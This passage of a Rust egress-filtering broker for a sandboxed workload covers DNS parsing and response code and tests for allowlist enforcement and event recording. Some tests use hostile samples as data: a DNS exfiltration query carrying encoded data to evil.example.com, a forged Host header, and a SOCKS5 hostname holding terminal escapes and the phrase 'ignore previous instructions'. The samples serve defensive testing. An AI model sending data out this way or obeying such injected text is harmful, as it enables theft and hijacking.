    let allowed = matches!(policy.check(&target), Verdict::Allow(_));
    policy.record(EgressEvent {
        proto: Proto::Dns,
        host: query.name.clone(),
        port: 0,
        allowed,
        reason: match decide(&policy.rules, &target) {
            Decision::Deny(r) => Some(r),
            Decision::Allow => None,
        },
        bytes_up: 0,
        bytes_down: 0,
        ts_ms: policy.now_ms(),
        note: None,
    });

    if !allowed {
        return Some(build_dns_response(&query, RCODE_NXDOMAIN, &[]));
    }
    if query.qtype != QTYPE_A {
        // A filtered slot has no IPv6 path at all, so AAAA is answered
        // NOERROR-with-no-records rather than NXDOMAIN: NXDOMAIN would assert
        // the name does not exist and make some resolvers give up on A too.
        return Some(build_dns_response(&query, RCODE_NOERROR, &[]));
    }

    let ips: Vec<Ipv4Addr> = match tokio::net::lookup_host((query.name.as_str(), 0)).await {
        Ok(iter) => iter
            .filter_map(|a| match a.ip() {
                IpAddr::V4(v4) => Some(v4),
                IpAddr::V6(_) => None,
            })
            .collect(),
        Err(_) => Vec::new(),
    };
    if ips.is_empty() {
        return Some(build_dns_response(&query, RCODE_NOERROR, &[]));
    }
    for ip in &ips {
        policy
            .recorder
            .remember_resolved(IpAddr::V4(*ip), &query.name);
    }
    Some(build_dns_response(&query, RCODE_NOERROR, &ips))
}

/// Parse a DNS query far enough to answer it. Pure and total.
///
/// Compression pointers are rejected: a QNAME in a query has nothing to point
/// back to, so a pointer here is either malformed or an attempt to confuse the
/// parser, and refusing is both simpler and safer than following it.
fn parse_dns_query(raw: &[u8]) -> Option<DnsQuery> {
    if raw.len() < 12 {
        return None;
    }
    let id = u16::from_be_bytes([raw[0], raw[1]]);
    let flags = u16::from_be_bytes([raw[2], raw[3]]);
    // QR must be 0 (a query) and OPCODE 0 (standard).
    if flags & 0x8000 != 0 || (flags >> 11) & 0x0f != 0 {
        return None;
    }
    let recursion_desired = flags & 0x0100 != 0;
    if u16::from_be_bytes([raw[4], raw[5]]) != 1 {
        // Exactly one question; multi-question queries are not used in practice.
        return None;
    }

    let mut pos = 12;
    let mut labels: Vec<&str> = Vec::new();
    loop {
        let len = *raw.get(pos)? as usize;
        if len & 0xc0 != 0 {
            return None; // compression pointer or reserved bits
        }
        pos += 1;
        if len == 0 {
            break;
        }
        let end = pos.checked_add(len)?;
        let label = raw.get(pos..end)?;
        labels.push(std::str::from_utf8(label).ok()?);
        pos = end;
    }
    let qtype = u16::from_be_bytes([*raw.get(pos)?, *raw.get(pos + 1)?]);
    let qclass = u16::from_be_bytes([*raw.get(pos + 2)?, *raw.get(pos + 3)?]);
    if qclass != 1 {
        return None; // IN only
    }
    let question = raw.get(12..pos + 4)?.to_vec();
    let name = if labels.is_empty() {
        SafeName::sanitized("")
    } else {
        SafeName::sanitized(&labels.join("."))
    };
    Some(DnsQuery {
        id,
        recursion_desired,
        name,
        qtype,
        question,
    })
}

/// A response carrying only a header (for malformed queries).
fn dns_header_only(id: u16, recursion_desired: bool, rcode: u8) -> Vec<u8> {
    let mut out = Vec::with_capacity(12);
    out.extend_from_slice(&id.to_be_bytes());
    out.push(0x84 | u8::from(recursion_desired)); // QR=1, AA=1, RD
    out.push(0x80 | rcode); // RA=1
    out.extend_from_slice(&0u16.to_be_bytes()); // QDCOUNT
    out.extend_from_slice(&0u16.to_be_bytes()); // ANCOUNT
    out.extend_from_slice(&0u16.to_be_bytes()); // NSCOUNT
    out.extend_from_slice(&0u16.to_be_bytes()); // ARCOUNT
    out
}

/// Build a response echoing the question and carrying zero or more A records.
///
/// Names in answers are written out in full rather than compressed: responses
/// are small, and a pointer-free encoder has no offset arithmetic to get wrong.
fn build_dns_response(query: &DnsQuery, rcode: u8, addrs: &[Ipv4Addr]) -> Vec<u8> {
    let name_wire = encode_dns_name(query.name.as_str());
    // Each answer is name + type(2) + class(2) + ttl(4) + rdlength(2) + rdata(4).
    let per_answer = name_wire.len() + 14;
    let budget = MAX_DNS_MSG.saturating_sub(12 + query.question.len());
    let max_answers = budget.checked_div(per_answer).unwrap_or(0);
    let answers = &addrs[..addrs.len().min(max_answers)];
    let truncated = answers.len() < addrs.len();

    let mut out = Vec::with_capacity(12 + query.question.len() + answers.len() * per_answer);
    out.extend_from_slice(&query.id.to_be_bytes());
    let mut flags_hi = 0x84 | u8::from(query.recursion_desired); // QR=1, AA=1, RD
    if truncated {
        flags_hi |= 0x02; // TC
    }
    out.push(flags_hi);
    out.push(0x80 | rcode); // RA=1
    out.extend_from_slice(&1u16.to_be_bytes()); // QDCOUNT
    let ancount = u16::try_from(answers.len()).unwrap_or(0);
    out.extend_from_slice(&ancount.to_be_bytes());
    out.extend_from_slice(&0u16.to_be_bytes()); // NSCOUNT
    out.extend_from_slice(&0u16.to_be_bytes()); // ARCOUNT
    out.extend_from_slice(&query.question);

    for addr in answers {
        out.extend_from_slice(&name_wire);
        out.extend_from_slice(&QTYPE_A.to_be_bytes());
        out.extend_from_slice(&1u16.to_be_bytes()); // class IN
        out.extend_from_slice(&ANSWER_TTL.to_be_bytes());
        out.extend_from_slice(&4u16.to_be_bytes()); // rdlength
        out.extend_from_slice(&addr.octets());
    }
    out
}

/// Encode a dotted name into length-prefixed wire form.
fn encode_dns_name(name: &str) -> Vec<u8> {
    let mut out = Vec::with_capacity(name.len() + 2);
    for label in name.split('.') {
        if label.is_empty() {
            continue;
        }
        // Labels reaching here came from `SafeName`, which caps them at 63.
        match u8::try_from(label.len()) {
            Ok(len) if len <= 63 => {
                out.push(len);
                out.extend_from_slice(label.as_bytes());
            }
            _ => return vec![0],
        }
    }
    out.push(0);
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn policy_with(patterns: &[&str]) -> Policy {
        Policy {
            rules: patterns
                .iter()
                .map(|p| HostRule::parse_host(p).expect("test pattern"))
                .collect(),
            recorder: Recorder::new(),
            conns: Arc::new(Semaphore::new(MAX_CONCURRENT_CONNS)),
        }
    }

    // --- HTTP head parsing -------------------------------------------------

    #[test]
    fn connect_uses_the_authority_not_the_host_header() {
        // The forged-Host case: the tunnel destination is the request-line
        // authority, so a lying Host header cannot redirect it.
        let head = b"CONNECT pypi.org:443 HTTP/1.1\r\nHost: evil.example.com\r\n\r\n";
        let req = parse_http_head(head).expect("must parse");
        assert!(matches!(req.kind, HttpKind::Connect));
        match &req.target {
            Target::Name(n, p) => {
                assert_eq!(n.as_str(), "pypi.org");
                assert_eq!(*p, 443);
            }
            other => panic!("expected a name target, got {other:?}"),
        }
    }

    #[test]
    fn connect_defaults_the_port_and_accepts_literals() {
        let req = parse_http_head(b"CONNECT pypi.org HTTP/1.1\r\n\r\n").unwrap();
        assert_eq!(req.target.port(), 443);

        // A literal authority becomes an Addr target, so the CIDR rules apply
        // rather than the name rules.
        let req = parse_http_head(b"CONNECT 151.101.0.223:443 HTTP/1.1\r\n\r\n").unwrap();
        assert!(matches!(req.target, Target::Addr(..)));
    }

    #[test]
    fn absolute_form_is_rewritten_to_origin_form_and_forced_closed() {
        let head =
            b"GET http://dl-cdn.alpinelinux.org/alpine/v3/main/x86_64/APKINDEX.tar.gz HTTP/1.1\r\n\
                     Host: dl-cdn.alpinelinux.org\r\n\
                     Proxy-Connection: keep-alive\r\n\
                     User-Agent: apk\r\n\r\n";
        let req = parse_http_head(head).expect("must parse");
        match &req.target {
            Target::Name(n, p) => {
                assert_eq!(n.as_str(), "dl-cdn.alpinelinux.org");
                assert_eq!(*p, 80);
            }
            other => panic!("expected a name target, got {other:?}"),
        }
        let HttpKind::Absolute { rewritten } = &req.kind else {
            panic!("expected absolute-form");
        };
        assert!(rewritten.starts_with("GET /alpine/v3/main/x86_64/APKINDEX.tar.gz HTTP/1.1\r\n"));
        assert!(rewritten.contains("User-Agent: apk\r\n"));
        // Hop-by-hop headers are stripped and the connection forced closed, so
        // it cannot be reused for a second, unchecked host.
        assert!(!rewritten.contains("Proxy-Connection"));
        assert_eq!(rewritten.matches("Connection: close").count(), 1);
        assert!(rewritten.ends_with("\r\n\r\n"));
    }

    #[test]
    fn non_proxy_and_malformed_requests_are_refused() {
        // Origin-form to a proxy names no host: nothing to check, so nothing to
        // forward.
        assert!(parse_http_head(b"GET /index.html HTTP/1.1\r\nHost: x.com\r\n\r\n").is_none());
        assert!(parse_http_head(b"garbage\r\n\r\n").is_none());
        assert!(parse_http_head(b"").is_none());
        assert!(parse_http_head(b"GET http:// HTTP/1.1\r\n\r\n").is_none());
    }

    #[test]
    fn https_absolute_form_is_refused_but_named() {
        // Some clients (busybox wget without TLS support) send this instead of
        // CONNECT. The broker cannot serve it without terminating TLS, but it
        // must still name the destination — a refusal the flight recorder
        // cannot attribute reads to an operator as "nothing was attempted".
        let req = parse_http_head(b"GET https://pypi.org/simple/ HTTP/1.1\r\n\r\n")
            .expect("must parse far enough to name the destination");
        assert!(matches!(req.kind, HttpKind::HttpsAbsolute));
        assert_eq!(req.target.safe_host().as_str(), "pypi.org");
        assert_eq!(req.target.port(), 443);

        // Explicit port and no path both still resolve.
        let req = parse_http_head(b"GET https://h.example:8443 HTTP/1.1\r\n\r\n").unwrap();
        assert_eq!(req.target.port(), 8443);
    }

    #[tokio::test]
    async fn every_refusal_reaches_the_flight_recorder() {
        // Regression: a request refused before it could name a destination used
        // to return 400 and record nothing, so `total_events` stayed 0 while the
        // workload was in fact being blocked.
        let broker = start_test_broker(Vec::new()).await;

        let mut c = TcpStream::connect(&broker.endpoints().http)
            .await
            .expect("connect");
        c.write_all(b"GET /origin-form HTTP/1.1\r\nHost: x\r\n\r\n")
            .await
            .expect("write");
        let mut resp = Vec::new();
        c.read_to_end(&mut resp).await.expect("read");
        assert!(String::from_utf8_lossy(&resp).starts_with("HTTP/1.1 400"));

        // And the https-absolute-form case gets a 501 that says what to do.
        let mut c = TcpStream::connect(&broker.endpoints().http)
            .await
            .expect("connect");
        c.write_all(b"GET https://pypi.org/simple/ HTTP/1.1\r\n\r\n")
            .await
            .expect("write");
        let mut resp = Vec::new();
        c.read_to_end(&mut resp).await.expect("read");
        let resp = String::from_utf8_lossy(&resp);
        assert!(resp.starts_with("HTTP/1.1 501"), "{resp}");
        assert!(resp.contains("CONNECT"), "{resp}");

        let (events, total) = broker.events();
        assert_eq!(total, 2, "both refusals recorded");
        assert!(events.iter().all(|e| !e.allowed));
        assert_eq!(events[0].note, Some("unparseable-proxy-request"));
        assert_eq!(events[1].note, Some("https-absolute-form-needs-connect"));
        assert_eq!(events[1].host.as_str(), "pypi.org");
    }

    #[test]
    fn http_error_bodies_never_echo_guest_input() {
        let body = http_error(403, DenyReason::NotAllowed.explain());
        assert!(body.starts_with("HTTP/1.1 403 Forbidden\r\n"));
        assert!(body.contains("not on this run's allowlist"));
        assert!(body.contains("Content-Length:"));
    }

    #[test]
    fn split_authority_handles_v6_and_defaults() {
        assert_eq!(split_authority("host:8080", 80), Some(("host", 8080)));
        assert_eq!(split_authority("host", 80), Some(("host", 80)));
        assert_eq!(
            split_authority("[2001:db8::1]:443", 80),
            Some(("2001:db8::1", 443))
        );
        assert_eq!(
            split_authority("[2001:db8::1]", 80),
            Some(("2001:db8::1", 80))
        );
        assert_eq!(split_authority("host:notaport", 80), None);
        assert_eq!(split_authority("", 80), None);
    }

    // --- policy ------------------------------------------------------------

    #[test]
    fn policy_denies_a_literal_the_broker_never_resolved() {
        let p = policy_with(&["pypi.org"]);
        let t = Target::Addr("151.101.0.223".parse().unwrap(), 443);
        assert!(matches!(
            p.check(&t),
            Verdict::Deny(DenyReason::LiteralAddress)
        ));
    }

    #[test]
    fn policy_accepts_a_literal_it_resolved_for_an_allowed_name() {
        let p = policy_with(&["pypi.org"]);
        let ip: IpAddr = "151.101.0.223".parse().unwrap();
        let name = SafeName::parse("pypi.org").unwrap();
        p.recorder.remember_resolved(ip, &name);

        // Now the same literal is the allowed name under a different spelling,
        // and is attributed to that name in the record.
        match p.check(&Target::Addr(ip, 443)) {
            Verdict::Allow(attributed) => assert_eq!(attributed.as_str(), "pypi.org"),
            Verdict::Deny(r) => panic!("expected allow, got {r:?}"),
        }
        // A neighbouring address the broker never handed out stays denied.
        let other: IpAddr = "151.101.0.224".parse().unwrap();
        assert!(matches!(
            p.check(&Target::Addr(other, 443)),
            Verdict::Deny(_)
        ));
    }

    #[test]
    fn recorder_caps_stored_events_but_keeps_counting() {
        let r = Recorder::new();
        let event = || EgressEvent {
            proto: Proto::Socks5,
            host: SafeName::sanitized("x.example"),
            port: 443,
            allowed: false,
            reason: Some(DenyReason::NotAllowed),
            bytes_up: 0,
            bytes_down: 0,
            ts_ms: 0,
            note: None,
        };
        for _ in 0..(MAX_RECORDED_EVENTS + 25) {
            r.record(event());
        }
        let (events, total) = r.snapshot();
        assert_eq!(events.len(), MAX_RECORDED_EVENTS);
        assert_eq!(total, MAX_RECORDED_EVENTS as u64 + 25);
    }

    // --- DNS ---------------------------------------------------------------

    /// Build a minimal query for `name` with the given qtype.
    fn dns_query_bytes(id: u16, name: &str, qtype: u16) -> Vec<u8> {
        let mut q = Vec::new();
        q.extend_from_slice(&id.to_be_bytes());
        q.extend_from_slice(&0x0100u16.to_be_bytes()); // RD
        q.extend_from_slice(&1u16.to_be_bytes()); // QDCOUNT
        q.extend_from_slice(&0u16.to_be_bytes());
        q.extend_from_slice(&0u16.to_be_bytes());
        q.extend_from_slice(&0u16.to_be_bytes());
        q.extend_from_slice(&encode_dns_name(name));
        q.extend_from_slice(&qtype.to_be_bytes());
        q.extend_from_slice(&1u16.to_be_bytes()); // class IN
        q
    }

    #[test]
    fn dns_query_round_trips_through_the_parser() {
        let raw = dns_query_bytes(0x1234, "files.pythonhosted.org", QTYPE_A);
        let q = parse_dns_query(&raw).expect("must parse");
        assert_eq!(q.id, 0x1234);
        assert!(q.recursion_desired);
        assert_eq!(q.name.as_str(), "files.pythonhosted.org");
        assert_eq!(q.qtype, QTYPE_A);
    }

    #[test]
    fn dns_parser_rejects_compression_pointers_and_junk() {
        // A pointer in a QNAME has nothing to point at; refuse rather than follow.
        let mut raw = dns_query_bytes(1, "a.example", QTYPE_A);
        raw[12] = 0xc0;
        assert!(parse_dns_query(&raw).is_none());

        assert!(parse_dns_query(&[]).is_none());
        assert!(parse_dns_query(&[0; 11]).is_none());
        // A response (QR=1), not a query.
        let mut resp = dns_query_bytes(1, "a.example", QTYPE_A);
        resp[2] |= 0x80;
        assert!(parse_dns_query(&resp).is_none());
        // Truncated mid-label.
        let raw = dns_query_bytes(1, "a.example", QTYPE_A);
        assert!(parse_dns_query(&raw[..14]).is_none());
    }

    #[test]
    fn dns_response_echoes_the_question_and_carries_answers() {
        let raw = dns_query_bytes(0xbeef, "pypi.org", QTYPE_A);
        let q = parse_dns_query(&raw).unwrap();
        let addrs = [
            "151.101.0.223".parse().unwrap(),
            "151.101.64.223".parse().unwrap(),
        ];
        let resp = build_dns_response(&q, RCODE_NOERROR, &addrs);

        assert_eq!(&resp[0..2], &0xbeefu16.to_be_bytes(), "id echoed");
        assert_eq!(resp[2] & 0x80, 0x80, "QR set");
        assert_eq!(resp[3] & 0x0f, RCODE_NOERROR);
        assert_eq!(u16::from_be_bytes([resp[4], resp[5]]), 1, "QDCOUNT");
        assert_eq!(u16::from_be_bytes([resp[6], resp[7]]), 2, "ANCOUNT");
        // The question section is echoed verbatim.
        assert_eq!(&resp[12..12 + q.question.len()], &q.question[..]);
        // The A record payloads are present.
        assert!(resp.windows(4).any(|w| w == [151, 101, 0, 223]));
        assert!(resp.windows(4).any(|w| w == [151, 101, 64, 223]));
        assert!(resp.len() <= MAX_DNS_MSG);
    }

    #[test]
    fn dns_nxdomain_response_has_no_answers() {
        let raw = dns_query_bytes(7, "evil.example.com", QTYPE_A);
        let q = parse_dns_query(&raw).unwrap();
        let resp = build_dns_response(&q, RCODE_NXDOMAIN, &[]);
        assert_eq!(resp[3] & 0x0f, RCODE_NXDOMAIN);
        assert_eq!(u16::from_be_bytes([resp[6], resp[7]]), 0, "no answers");
    }

    #[test]
    fn dns_response_stays_within_the_udp_limit() {
        // Many addresses for a long name must be truncated with TC set rather
        // than overflowing the 512-byte ceiling.
        let long = format!("{}.example.com", "a".repeat(60));
        let raw = dns_query_bytes(1, &long, QTYPE_A);
        let q = parse_dns_query(&raw).unwrap();
        let addrs: Vec<Ipv4Addr> = (0..40).map(|i| Ipv4Addr::new(10, 0, 0, i)).collect();
        let resp = build_dns_response(&q, RCODE_NOERROR, &addrs);
        assert!(resp.len() <= MAX_DNS_MSG, "len {}", resp.len());
        assert_eq!(
            resp[2] & 0x02,
            0x02,
            "TC must be set when answers are dropped"
        );
    }

    #[test]
    fn encode_dns_name_is_length_prefixed() {
        assert_eq!(encode_dns_name("a.bc"), vec![1, b'a', 2, b'b', b'c', 0]);
        assert_eq!(encode_dns_name(""), vec![0]);
    }

    #[test]
    fn malformed_query_still_gets_a_formerr_header() {
        let out = dns_header_only(0x0102, false, RCODE_FORMERR);
        assert_eq!(out.len(), 12);
        assert_eq!(&out[0..2], &[0x01, 0x02]);
        assert_eq!(out[3] & 0x0f, RCODE_FORMERR);
    }

    // --- end to end over loopback -----------------------------------------
    //
    // These drive a real broker with real sockets. No VM, no tap, no /dev/kvm,
    // so unlike the live bypass ledger they run in CI on every push — which is
    // where the allow/deny path most needs a regression net.

    /// A one-shot upstream that greets and echoes, standing in for a real
    /// destination. Returns its address.
    async fn spawn_echo() -> SocketAddr {
        let listener = TcpListener::bind(SocketAddr::from(([127, 0, 0, 1], 0)))
            .await
            .expect("bind echo");
        let addr = listener.local_addr().expect("echo addr");
        tokio::spawn(async move {
            while let Ok((mut sock, _)) = listener.accept().await {
                tokio::spawn(async move {
                    let _ = sock.write_all(b"UPSTREAM").await;
                    let mut buf = [0u8; 64];
                    if let Ok(n) = sock.read(&mut buf).await {
                        let _ = sock.write_all(&buf[..n]).await;
                    }
                });
            }
        });
        addr
    }

    async fn start_test_broker(rules: Vec<HostRule>) -> Broker {
        Broker::start(BrokerSpec {
            gateway: Ipv4Addr::LOCALHOST,
            rules,
            // Ephemeral: the fixed ports would collide between concurrent tests
            // and with anything already listening on the developer's machine.
            ports: BrokerPorts {
                socks: 0,
                http: 0,
                dns: 0,
            },
        })
        .await
        .expect("broker must start")
    }

    /// Drive a SOCKS5 CONNECT to a literal address; return the reply code and
    /// the stream on success.
    async fn socks_connect(broker: &Broker, dst: SocketAddr) -> (u8, TcpStream) {
        let mut c = TcpStream::connect(&broker.endpoints().socks)
            .await
            .expect("connect to broker");
        c.write_all(&[0x05, 0x01, 0x00]).await.expect("greeting");
        let mut greet = [0u8; 2];
        c.read_exact(&mut greet).await.expect("greeting reply");
        assert_eq!(greet, [0x05, 0x00]);

        let IpAddr::V4(v4) = dst.ip() else {
            panic!("test uses IPv4")
        };
        let mut req = vec![0x05, 0x01, 0x00, 0x01];
        req.extend_from_slice(&v4.octets());
        req.extend_from_slice(&dst.port().to_be_bytes());
        c.write_all(&req).await.expect("request");

        let mut reply = [0u8; 10];
        c.read_exact(&mut reply).await.expect("reply");
        (reply[1], c)
    }

    #[tokio::test]
    async fn socks5_allows_a_cidr_permitted_destination_and_carries_bytes() {
        let upstream = spawn_echo().await;
        let broker =
            start_test_broker(vec![HostRule::parse_cidr("127.0.0.0/8").expect("cidr")]).await;

        let (code, mut stream) = socks_connect(&broker, upstream).await;
        assert_eq!(
            code,
            socks_reply::OK,
            "CIDR-allowed destination must connect"
        );

        // Bytes really flow in both directions through the broker.
        let mut hello = [0u8; 8];
        stream
            .read_exact(&mut hello)
            .await
            .expect("upstream greeting");
        assert_eq!(&hello, b"UPSTREAM");
        stream.write_all(b"ping").await.expect("write");
        let mut echoed = [0u8; 4];
        stream.read_exact(&mut echoed).await.expect("echo");
        assert_eq!(&echoed, b"ping");

        let (events, total) = broker.events();
        assert_eq!(total, 1);
        assert!(events[0].allowed);
        assert_eq!(events[0].proto, Proto::Socks5);
        assert_eq!(events[0].port, upstream.port());
    }

    #[tokio::test]
    async fn socks5_refuses_a_destination_outside_the_allowlist() {
        let upstream = spawn_echo().await;
        // Allowlist a name, not this address: the literal-address rule applies.
        let broker = start_test_broker(vec![HostRule::parse_host("pypi.org").expect("host")]).await;

        let (code, _stream) = socks_connect(&broker, upstream).await;
        assert_eq!(
            code,
            socks_reply::NOT_ALLOWED,
            "a refusal must be explicit, not a hang"
        );

        let (events, _) = broker.events();
        assert_eq!(events.len(), 1);
        assert!(!events[0].allowed);
        assert_eq!(events[0].reason, Some(DenyReason::LiteralAddress));
    }

    #[tokio::test]
    async fn empty_allowlist_denies_but_still_records() {
        let upstream = spawn_echo().await;
        let broker = start_test_broker(Vec::new()).await;

        let (code, _stream) = socks_connect(&broker, upstream).await;
        assert_eq!(code, socks_reply::NOT_ALLOWED);

        // Observability-without-egress: the attempt is on the record.
        let (events, total) = broker.events();
        assert_eq!(total, 1);
        assert_eq!(events[0].reason, Some(DenyReason::EmptyAllowlist));
    }

    #[tokio::test]
    async fn http_connect_tunnels_when_allowed_and_403s_when_not() {
        let upstream = spawn_echo().await;
        let broker =
            start_test_broker(vec![HostRule::parse_cidr("127.0.0.0/8").expect("cidr")]).await;

        let mut c = TcpStream::connect(&broker.endpoints().http)
            .await
            .expect("connect");
        c.write_all(format!("CONNECT 127.0.0.1:{} HTTP/1.1\r\n\r\n", upstream.port()).as_bytes())
            .await
            .expect("write");
        let mut buf = [0u8; 39];
        c.read_exact(&mut buf).await.expect("read");
        assert_eq!(&buf[..], b"HTTP/1.1 200 Connection established\r\n\r\n");

        // A destination outside the allowlist gets a clear 403, not a hang.
        let denied = start_test_broker(Vec::new()).await;
        let mut c = TcpStream::connect(&denied.endpoints().http)
            .await
            .expect("connect");
        c.write_all(b"CONNECT example.com:443 HTTP/1.1\r\n\r\n")
            .await
            .expect("write");
        let mut resp = Vec::new();
        c.read_to_end(&mut resp).await.expect("read");
        let resp = String::from_utf8_lossy(&resp);
        assert!(resp.starts_with("HTTP/1.1 403 Forbidden"), "{resp}");
        assert!(resp.contains("permits no egress"), "{resp}");
    }

    #[tokio::test]
    async fn dns_nxdomains_a_name_that_is_not_allowed() {
        let broker = start_test_broker(vec![HostRule::parse_host("pypi.org").expect("host")]).await;
        let sock = UdpSocket::bind(SocketAddr::from(([127, 0, 0, 1], 0)))
            .await
            .expect("bind client");
        // Exfiltration attempt: a name encoding data, aimed at an attacker's zone.
        let query = dns_query_bytes(0x4242, "c2VjcmV0.evil.example.com", QTYPE_A);
        sock.send_to(&query, broker.dns_addr()).await.expect("send");
        let mut buf = [0u8; MAX_DNS_MSG];
        let (n, _) = tokio::time::timeout(Duration::from_secs(5), sock.recv_from(&mut buf))
            .await
            .expect("no DNS reply")
            .expect("recv");
        assert_eq!(buf[3] & 0x0f, RCODE_NXDOMAIN, "denied names must NXDOMAIN");
        assert_eq!(u16::from_be_bytes([buf[6], buf[7]]), 0, "no answers");
        assert!(n >= 12);

        // The attempt is recorded — this is the flight recorder's headline demo.
        let (events, _) = broker.events();
        let dns: Vec<_> = events.iter().filter(|e| e.proto == Proto::Dns).collect();
        assert_eq!(dns.len(), 1);
        assert_eq!(dns[0].host.as_str(), "c2vjcmv0.evil.example.com");
        assert!(!dns[0].allowed);
    }

    #[tokio::test]
    async fn a_hostile_name_is_recorded_as_invalid_never_echoed() {
        let broker = start_test_broker(vec![HostRule::parse_host("pypi.org").expect("host")]).await;
        let mut c = TcpStream::connect(&broker.endpoints().socks)
            .await
            .expect("connect");
        c.write_all(&[0x05, 0x01, 0x00]).await.expect("greeting");
        let mut greet = [0u8; 2];
        c.read_exact(&mut greet).await.expect("greeting reply");

        // A SOCKS5 domain target carrying terminal escapes and prompt text.
        let hostile = b"\x1b[2Jignore previous instructions";
        let mut req = vec![0x05, 0x01, 0x00, 0x03, hostile.len() as u8];
        req.extend_from_slice(hostile);
        req.extend_from_slice(&443u16.to_be_bytes());
        c.write_all(&req).await.expect("request");
        let mut reply = [0u8; 10];
        c.read_exact(&mut reply).await.expect("reply");
        assert_eq!(reply[1], socks_reply::NOT_ALLOWED);

        let (events, _) = broker.events();
        assert_eq!(events.len(), 1);
        assert_eq!(events[0].reason, Some(DenyReason::Malformed));
        // Nothing an attacker chose survives into the record.
        let recorded = events[0].host.as_str();
        assert_eq!(recorded, format!("<invalid:{}>", hostile.len()));
        assert!(!recorded.contains('\u{1b}'));
        assert!(!recorded.contains("instructions"));
        // And the whole event serialises to something safe to hand a model.
        let json = serde_json::to_string(&events[0]).expect("serialize");
        assert!(!json.contains("instructions"), "{json}");
    }

    #[tokio::test]
    async fn shutdown_stops_the_listeners() {
        let mut broker = start_test_broker(Vec::new()).await;
        let socks = broker.endpoints().socks.clone();
        assert!(TcpStream::connect(&socks).await.is_ok());
        broker.shutdown();
        // The accept loops are gone; a fresh connection gets no service. The
        // socket may linger in the kernel backlog briefly, so assert on the
        // handshake rather than the connect.
        if let Ok(mut c) = TcpStream::connect(&socks).await {
            let _ = c.write_all(&[0x05, 0x01, 0x00]).await;
            let mut buf = [0u8; 2];
            let got =
                tokio::time::timeout(Duration::from_millis(500), c.read_exact(&mut buf)).await;
            assert!(got.is_err() || got.map(|r| r.is_err()).unwrap_or(true));
        }
    }
}
